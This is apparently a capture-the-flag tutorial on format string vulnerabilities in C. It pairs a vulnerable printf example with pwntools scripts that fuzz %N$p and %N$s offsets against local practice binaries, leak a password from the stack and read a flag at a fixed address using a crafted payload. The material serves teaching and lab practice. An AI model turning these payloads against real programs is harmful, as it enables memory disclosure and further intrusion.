# Format String Exploits

A format string vulnerability is a bug where user input is passed as the format argument to printf, scanf, or another function in that family.

The format argument has many different specifiers which could allow an attacker to leak data if they control the format argument to printf. Since printf and similar are variadic functions, they will continue popping data off of the stack according to the format.

Example:
```c
#include <stdio.h>
#include <unistd.h>

int main() {
    int secret_num = 0x8badf00d;

    char name[64] = {0};
    read(0, name, 64);
    printf("Hello ");
    printf(name);
    printf("! You'll never get my secret!\n");
    return 0;
}
```
Due to how GCC decided to lay out the stack, secret_num is actually at a lower address on the stack than name, so we only have to go to the 7th "argument" in printf to leak the secret:

```bash
$ ./fmt_string
%7$llx
Hello 8badf00d3ea43eef
! You'll never get my secret!
```

# Format Strings - Arbitrary Read 
## TYPE 1
In basic lavel we just have to leak the memory ,here is an example :

![image](https://github.com/user-attachments/assets/d07c0a0f-788b-40bb-8aa7-8e475989ae2d)

Here we are getting the same thing that we are inputing lets try %x,%p,%s,%llx to find is it a formatstring vurnabilty.
![image](https://github.com/user-attachments/assets/e1c95c23-f0de-41ee-8ed1-48af83ec08eb)
yes it is, lets leak more
```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    payload = f'%{i}$p'
    io.sendline(payload)
    print(io.recvall())
```
OR 
```py
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./format_vuln', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        # Receive the response
        result = p.recvuntil(b'> ')
        # Check for flag
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```
![image](https://github.com/user-attachments/assets/f4d233c0-3c8e-4c11-8d65-ab6f7a144efc)

And After From Hex the password is : Pa$$w0rd_1s_0n_Th3_St4ck
![image](https://github.com/user-attachments/assets/5d1d462a-8acd-4ac7-87e7-8416602aceec)


## TYPE 2
Here is a another type after the password there is another input
![image](https://github.com/user-attachments/assets/02d92cac-7c24-4bf1-b5ea-ac8facc20fa9)
Lets check
![image](https://github.com/user-attachments/assets/c5a9b899-a84d-425f-9769-dc3e1b070d82)
Yes we can do the same but now our task is to leak flag from the given address . so is short wht we have to do is we have to find the offset and put the flag address to leak the flag .

![image](https://github.com/user-attachments/assets/0797952a-ee32-45f0-abf6-6146fd4d3823)

```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

for i in range(1,50):
    io = process('./fmt_read')
    io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```
Here 16 is our offset.So lets find the flag.
![image](https://github.com/user-attachments/assets/ba9ecc61-46cf-427a-b3d3-1923529208ca)
Here we go 
```py
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'


io = process('./fmt_read')
io.sendline('Pa$$w0rd_1s_0n_Th3_St4ck')
payload = b'%17$sAAA' + p64(0x404080)
io.sendline(payload)
io.interactive()


# nm ./fmt_read  fr address
```
